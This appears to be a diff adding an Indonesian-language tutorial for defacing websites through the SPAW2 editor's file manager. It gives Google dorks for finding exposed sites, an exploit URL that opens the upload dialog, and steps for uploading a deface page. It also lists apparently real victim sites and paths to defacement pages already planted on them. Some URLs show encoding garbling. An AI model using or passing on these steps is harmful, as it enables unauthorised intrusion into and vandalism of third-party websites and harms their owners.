@@ -1,0 +1,42 @@
+Tutorial Cara Deface Dengan Menggunakan Metode Spaw
+
+1).Pilih Salah Satu Dork Di Bawah Ini Copy , Paste Dan Search Dork Di Google
+
+Dork :
+
+inurl:”spaw2/uploads/files/
+inurl:”spaw2/uploads/files/” site:.com.my
+spaw2 dialogs dialog php
+
+site:.com.my Bisa Di Ubah Menjadi site:.com.il site:.com.uk Dll Atau site:.net site:.biz site:.etc
+
+2).Pilih Salah Satu Web Yang Ingin Di Deface
+
+
+Contoh Web Yang Ingin Saya Deface : http://www.sangioacchino.org
+
+http://www.commercexp.com/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2&lang=es&charset=&scid=
+  http://www.uniaks.ru/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2&lang=es&charset=&scid=
+
+3).Masukkan Exploit Berikut :
+/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2<=es&charset=&scid=cf73b.58bb51c52235494da752d98cac9&type=files
+Di Belakang Domain
+
+Contoh : http://www.sangioacchino.org/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2%E2%8C%A9=es&charset=&scid=cf73b.58bb51c52235494da752d98cac9&type=files
+
+4).Jika Sudah Masuk Ke Halaman Upload , Bagian Pilihan Pojok Kiri Atas Flash Movies/Images Ubah Menjadi Files
+
+5).Pilih Script Deface Dan Klik Upload
+
+6).Untuk Melihat Hasil Deface www.site.com/spaw2/uploads/files/namafile.html.
+
+Contoh :
+http://www.sangioacchino.org/spaw2/uploads/files/FC.html
+http://www.sh.mahidol.ac.th/spaw2/uploads/files/FC.html
+http://matix-power.ro/spaw2/uploads/files/FC.html
+
+http://www.wholehealthamerica.com/spaw2/uploads/files/
+
+http://vprofite.com/include/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2&lang=es&charset&scid=cf73b58bb51c52235494da752d98cac9&type=files
+
+http://www.sucofindo.co.id/bin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2&lang=en&charset=&scid=84d8bd5f5e3a9010b9a70aba58aa564f&type=anyundefined
